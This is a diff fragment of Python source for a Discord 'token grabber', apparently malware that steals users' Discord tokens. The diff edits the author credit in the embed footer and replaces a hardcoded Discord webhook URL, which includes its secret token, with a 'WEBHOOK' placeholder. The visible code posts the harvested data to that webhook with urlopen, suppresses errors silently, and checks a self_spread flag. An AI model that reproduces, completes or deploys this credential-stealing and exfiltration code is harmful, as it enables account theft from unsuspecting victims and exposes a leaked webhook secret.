@@ -166,7 +166,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token grabber by 𝘞 𝘢 𝘬 𝘪 𝘪.#0001"
+                    "text": f"Token grabber by Wakii™#0001"
                 }
 
             }
@@ -184,7 +184,7 @@ def main():
         "avatar_url": "https://cdn.discordapp.com/attachments/876911212368121938/877230723105431603/f2ae8e2cde7e371b71e45924513bfe4a.jpg"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/876911238687391814/Bn-1zvL7x4W5rX_9ocyoYRWTIkwYCSASXef3XKDO4_6JUJprkbVTnKrCN7ezpRkZfxD3", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("WEBHOOK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
